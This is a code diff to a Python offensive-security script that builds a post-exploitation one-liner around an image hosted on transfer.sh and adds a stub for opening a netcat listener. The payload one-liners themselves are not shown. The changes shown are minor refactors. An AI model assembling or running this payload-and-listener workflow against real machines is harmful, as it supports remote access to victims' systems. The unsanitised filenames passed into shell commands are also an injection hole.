@@ -12,6 +12,13 @@ from termcolor import colored
 from pyfiglet import Figlet
 
 
+def listener():
+    """Open a netcat listener"""
+
+    print('\n')
+    print(colored("Set up a listener", 'red'))
+
+
 def payload_generator(imageurl):
     """Generate oneliner post exploitation command"""
 
@@ -24,7 +31,7 @@ def payload_generator(imageurl):
         system = input("Type number: ")
         if not system.isnumeric():
             continue
-        elif int(system) == 1 or int(system) == 2:
+        if int(system) == 1 or int(system) == 2:
             break
 
     # Generate oneliner for OSX
@@ -61,7 +68,6 @@ def uploadimage(file):
     """Upload image to transfer.sh free hosting service"""
 
     url = os.popen("curl -s --upload-file ./" + file + " https://transfer.sh/" + file).read()
-    print('\n')
     print(colored("[+] Image uploaded!", 'red'))
     print(url)
 
@@ -105,9 +111,10 @@ def main():
     os.system("rm " + filename)
     # Generate and output payload
     payload_generator(urlimage)
+    # Open nc listener
+    listener()
 
 
 if __name__ == "__main__":
     os.system('clear')
     main()
-    print('\n')
